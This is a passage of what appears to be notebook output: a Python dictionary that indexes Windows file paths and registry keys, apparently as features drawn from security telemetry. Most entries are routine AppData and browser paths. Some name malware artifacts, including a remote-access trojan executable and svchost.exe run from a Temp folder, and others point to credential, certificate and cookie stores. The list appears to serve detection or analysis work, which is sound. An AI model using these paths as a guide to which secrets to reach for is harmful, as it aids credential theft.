       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 601,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\de': 602,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\css': 603,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\yo-NG\\\\*': 604,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities\\\\Hidden': 605,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\TempState\\\\.git': 606,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 607,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\*': 608,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.3_8wekyb3d8bbwe\\\\AC': 609,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\PKIMetadata': 610,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637849849811270000\\\\2\\\\Data': 611,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\tn-ZA\\\\*': 612,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe\\\\AC': 613,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 614,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\*': 615,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\el-GR\\\\*': 616,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\Settings': 617,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\\\\TempState\\\\.git': 618,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\sessionstore-backups\\\\*': 619,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AppData\\\\.git': 620,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\SystemAppData\\\\*': 621,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ru\\\\.git': 622,\n",
       " 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\SAMLIB.dll': 623,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\3D Objects': 624,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\nb-NO\\\\.git': 625,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\auoms-rules\\\\*': 626,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\BackgroundTransferApi\\\\*': 627,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\LocalCache\\\\*': 628,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\.git': 629,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\tr-TR\\\\*': 630,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\uk\\\\*': 631,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 632,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\IECompatUaCache': 633,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338389': 634,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\TempState\\\\*': 635,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\RoamingState': 636,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\WidevineCdm\\\\*': 637,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 638,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings\\\\.git': 639,\n",
       " 'Caso_Flawed_AMMYY_RAT_M41nt.exe': 640,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ro\\\\*': 641,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\SystemAppData': 642,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\.git': 643,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\pt_BR\\\\*': 644,\n",
       " '0f877ad5464fcbb12e1c019adf7065cc.dll': 645,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-PR\\\\*': 646,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\LocalCache\\\\*': 647,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\LocalCache\\\\.git': 648,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 649,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AppData\\\\CacheStorage\\\\.git': 650,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\crashes': 651,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\se\\\\*': 652,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fr\\\\.git': 653,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe': 654,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pt-PT\\\\*': 655,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC': 656,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\.git': 657,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\shared_proto_db\\\\.git': 658,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\*': 659,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 660,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\lv': 661,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\kk': 662,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\2823318777ntouromlalnodry--naod.files\\\\.git': 663,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\.git': 664,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\2\\\\*': 665,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\el': 666,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sr\\\\.git': 667,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\LocalState\\\\*': 668,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\*': 669,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\*': 670,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Controls\\\\Styles': 671,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\lt': 672,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\kk-KZ': 673,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension State\\\\*': 674,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\de-DE\\\\*': 675,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\uk\\\\*': 676,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sr\\\\.git': 677,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\TempState\\\\.git': 678,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp': 679,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\quc\\\\.git': 680,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\AC\\\\*': 681,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\SystemAppData': 682,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\.git': 683,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\2\\\\*': 684,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\es': 685,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6\\\\_platform_specific\\\\win_x64\\\\*': 686,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\AC\\\\Temp': 687,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 688,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\ImplicitAppShortcuts': 689,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\es_419': 690,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-US\\\\*': 691,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\LocalState\\\\*': 692,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280815\\\\.git': 693,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\ms\\\\.git': 694,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AppData': 695,\n",
       " 'C:\\\\Users\\\\julie68\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD-MXS\\\\.git': 696,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 697,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 698,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\.git': 699,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt': 700,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ko': 701,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Feature Engagement Tracker': 702,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\da\\\\.git': 703,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\*': 704,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\*': 705,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\nso-ZA\\\\.git': 706,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 707,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings\\\\.git': 708,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates\\\\My\\\\*': 709,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ar\\\\*': 710,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\AC\\\\.git': 711,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pl\\\\.git': 712,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sessions\\\\*': 713,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 714,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 715,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState\\\\.git': 716,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-KW\\\\.git': 717,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AppData\\\\*': 718,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\TempState': 719,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\.git': 720,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 721,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\.git': 722,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 723,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\.git': 724,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\hu': 725,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\LocalState\\\\*': 726,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default': 727,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\ru\\\\.git': 728,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 729,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0_32\\\\UsageLogs\\\\.git': 730,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 731,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{559D40A3-A036-40FA-AF61-84CB430A4D34}\\\\InitFolderHandler': 732,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 733,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\RoamingState\\\\*': 734,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\*': 735,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\Settings\\\\.git': 736,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338387\\\\.git': 737,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 738,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\blob_storage': 739,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\nn-NO': 740,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 741,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\no\\\\*': 742,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials': 743,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Comms': 744,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\lv\\\\*': 745,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\.git': 746,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\it\\\\*': 747,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sr\\\\.git': 748,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\hi-IN\\\\.git': 749,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\*': 750,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\FeatureControl\\\\FEATURE_BLOCK_WEAK_ENCRYPTION': 751,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 752,\n",
       " '\"C:\\\\Users\\\\jessicagomez\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe\" ': 753,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\AppData': 754,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\uk': 755,\n",
